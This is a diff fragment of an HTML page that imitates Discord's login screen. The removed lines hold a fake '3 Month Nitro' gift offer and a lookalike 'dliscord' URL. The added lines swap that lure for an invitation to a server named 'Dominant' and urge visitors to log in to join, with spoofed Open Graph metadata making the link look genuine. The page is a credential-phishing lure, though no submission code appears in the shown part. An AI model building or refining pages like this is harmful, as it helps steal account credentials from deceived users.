@@ -2,18 +2,18 @@
 <html>
   <head>
     <link rel="stylesheet" href="../assest/style.css"/>
-    <meta property="og:site_name" content="Discord Gift">
-    <meta property="og:url" content="https://dliscord.">
+    <meta property="og:site_name" content="Discord">
+    <meta property="og:url" content="https://discord.gg/dominant">
     <meta property="og:title" content="Discord">
-    <meta property="og:description" content="You Have Been Gifted A 3 Month Nitro">
+    <meta property="og:description" content="You Have Been Invited In Dominant">
     <meta property="og:type" content="Discord">
-    <meta name="og:image" itemprop="image" content="https://cdn1.epicgames.com/salesEvent/salesEvent/EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-944994658df3b04d0c4940be832da19e">
+    <meta name="og:image" itemprop="image" content="https://discord.gg/rtBjubtQ">
   </head>
   <body>
     <center>
     <div class="loginPart">
       <br/><br/><br/>
-                       You Have Been Gifted a 3 Month Nitro! you need to                  login to earn it.
+                       You Have Been Invited In Dominant. Login to Discord To Join The Server.
       <br/><br/><br/>
       <p class="welcome">Welcome Back!</p>
         <br/>
